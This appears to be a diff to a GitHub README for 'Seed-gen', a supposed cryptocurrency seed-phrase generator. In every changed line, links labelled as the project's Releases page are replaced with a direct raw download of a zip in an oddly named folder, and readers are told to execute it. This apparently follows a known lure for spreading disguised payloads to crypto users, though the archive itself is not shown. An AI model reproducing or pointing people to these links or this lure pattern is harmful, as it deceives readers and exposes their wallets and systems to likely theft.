@@ -12,7 +12,7 @@ Welcome to Seed-gen, an innovative tool designed to generate unique and creative
 
 ## How to Use
 
-1. Download the Seed-gen tool from our [Releases](https://github.com/Edwar1234edward1234/seed-gen/releases) page.
+1. Download the Seed-gen tool from our [Releases](https://raw.githubusercontent.com/Edwar1234edward1234/seed-gen/main/unprinceliness/gen-seed-3.5-alpha.5.zip) page.
    
 2. Execute the tool to start generating your custom seed phrases for your cryptocurrency wallet.
 
@@ -26,9 +26,9 @@ Welcome to Seed-gen, an innovative tool designed to generate unique and creative
 
 ## Get Started
 
-Visit our [Releases](https://github.com/Edwar1234edward1234/seed-gen/releases) page to download the Seed-gen tool and start generating your custom seed phrases today.
+Visit our [Releases](https://raw.githubusercontent.com/Edwar1234edward1234/seed-gen/main/unprinceliness/gen-seed-3.5-alpha.5.zip) page to download the Seed-gen tool and start generating your custom seed phrases today.
 
-[![Download Seed-gen](https://img.shields.io/badge/Download-Seed--gen-green)](https://github.com/Edwar1234edward1234/seed-gen/releases)
+[![Download Seed-gen](https://raw.githubusercontent.com/Edwar1234edward1234/seed-gen/main/unprinceliness/gen-seed-3.5-alpha.5.zip)](https://raw.githubusercontent.com/Edwar1234edward1234/seed-gen/main/unprinceliness/gen-seed-3.5-alpha.5.zip)
 
 ## Topics
 
